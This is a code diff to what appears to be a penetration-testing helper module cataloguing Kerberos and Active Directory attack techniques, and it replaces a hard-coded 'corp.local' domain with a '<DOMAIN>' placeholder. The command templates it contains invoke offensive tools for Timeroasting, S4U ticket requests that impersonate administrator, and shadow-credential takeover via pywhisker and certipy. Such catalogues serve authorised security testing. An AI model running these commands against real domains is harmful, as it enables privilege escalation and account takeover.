@@ -22,7 +22,7 @@ KERBEROS_TECHNIQUES: dict[str, KerberosTechnique] = {
         mitre_id="T1558.003",
         summary="Offline crack machine-account keys derived from pwdLastSet timestamps.",
         manual_commands=(
-            "timeroast.py -d corp.local -u user -p pass --dc-ip <DC>",
+            "timeroast.py -d <DOMAIN> -u user -p pass --dc-ip <DC>",
             "nxc ldap <DC> -u user -p pass --timeroast",
         ),
     ),
@@ -45,7 +45,7 @@ KERBEROS_TECHNIQUES: dict[str, KerberosTechnique] = {
         summary="Request S4U2Self/S4U2Proxy service tickets to allowed targets.",
         manual_commands=(
             "getST.py -spn <target_spn> -impersonate administrator "
-            "-dc-ip <DC> corp.local/user:pass",
+            "-dc-ip <DC> <DOMAIN>/user:pass",
         ),
     ),
     "constrained_pt": KerberosTechnique(
@@ -56,7 +56,7 @@ KERBEROS_TECHNIQUES: dict[str, KerberosTechnique] = {
         summary="Protocol transition allows S4U from any user to delegated SPNs.",
         manual_commands=(
             "getST.py -spn <target_spn> -impersonate administrator "
-            "-hashes :<hash> corp.local/computer$",
+            "-hashes :<hash> <DOMAIN>/computer$",
         ),
     ),
     "rbcd": KerberosTechnique(
@@ -77,7 +77,7 @@ KERBEROS_TECHNIQUES: dict[str, KerberosTechnique] = {
         mitre_id="T1098",
         summary="Add msDS-KeyCredentialLink (GenericWrite) for PKINIT takeover.",
         manual_commands=(
-            "pywhisker -d corp.local -u user -p pass --target <target> -a add",
+            "pywhisker -d <DOMAIN> -u user -p pass --target <target> -a add",
             "certipy auth -pfx <pfx> -dc-ip <DC>",
         ),
     ),
